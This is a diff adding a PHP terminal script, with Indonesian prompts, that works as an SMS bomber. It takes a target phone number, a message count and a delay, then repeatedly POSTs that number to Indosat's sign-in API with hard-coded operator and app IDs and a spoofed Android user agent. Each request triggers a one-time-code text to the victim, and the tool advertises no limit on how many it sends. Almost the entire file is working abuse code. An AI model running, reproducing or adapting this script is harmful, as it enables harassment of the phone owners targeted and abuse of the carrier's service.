@@ -1,0 +1,66 @@
+<?php
+# Ahmad Khoirul Marzuqin
+$n = "\e[0m"; # Normal
+# Ahmad Khoirul Marzuqin
+$c = "\e[90m"; # Coklat
+# Ahmad Khoirul Marzuqin
+$m = "\e[91m"; # Merah
+# Ahmad Khoirul Marzuqin
+$h = "\e[92m"; # Hijau
+# Ahmad Khoirul Marzuqin
+$k = "\e[93m"; # Kuning
+# Ahmad Khoirul Marzuqin
+$u = "\e[94m"; # Ungu
+# Ahmad Khoirul Marzuqin
+$p = "\e[95m"; # Pink
+# Ahmad Khoirul Marzuqin
+$b = "\e[96m"; # Biru
+# Ahmad Khoirul Marzuqin
+echo "$u             ╔════════════════════════╗
+             ║$k Sms      :$h myIM3$u       ║
+             ║$k Maksimal :$h Tanpa Batas$u ║
+             ╚════════════════════════╝
+
+╔═╗
+║".$n."›".$u."║$k Nomor Target       :$h ";
+# Ahmad Khoirul Marzuqin
+$nomor = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║".$n."›".$u."║$h Jumlah Pesan Sms   :$k ";
+# Ahmad Khoirul Marzuqin
+$jumlah = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║".$n."›".$u."║$p Jeda Pesan Per Sms :$b ";
+# Ahmad Khoirul Marzuqin
+$jeda = trim(fgets(STDIN));
+# Ahmad Khoirul Marzuqin
+echo $u."║ ║\n";
+# Ahmad Khoirul Marzuqin
+for ($j=1; $j <= $jumlah; $j++) {
+$ch = array("Content-Type: application/json", "operatorId: 50e22f864fc644c081c0e18319187547", "appId: 168e2950623a4dbe8a57beec814ad6b5", "clientVersion: 127");
+$je = array("msisdn" => "$nomor");
+$cp = json_encode($je);
+$cu = "https://osa-indosat.lotusflare.com/api/1.0/dcp/user/indosat_begin_sign_in";
+$cua = "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_X00AD Build/MMB29M)";
+$ci = curl_init();
+curl_setopt($ci, CURLOPT_HEADER, 1);
+curl_setopt($ci, CURLOPT_HTTPHEADER, $ch);
+curl_setopt($ci, CURLOPT_POST, 1);
+curl_setopt($ci, CURLOPT_POSTFIELDS, $cp);
+curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ci, CURLOPT_URL, $cu);
+curl_setopt($ci, CURLOPT_USERAGENT, $cua);
+sleep($jeda);
+$ce = curl_exec($ci);
+curl_close($ci);
+preg_match("/challengeId/", $ce, $kodece);
+if ($kodece[0] == "challengeId") {
+echo $u."║".$n."›".$u."║$p Mengirim Pesan Sms :$b $j$h ✓\r";
+}else{
+echo $u."║".$n."›".$u."║$m !!! Koneksi Internet !!!\r";
+}
+}
+# Ahmad Khoirul Marzuqin
+echo "$u\n╚═╝\n";
+# Ahmad Khoirul Marzuqin
+?>
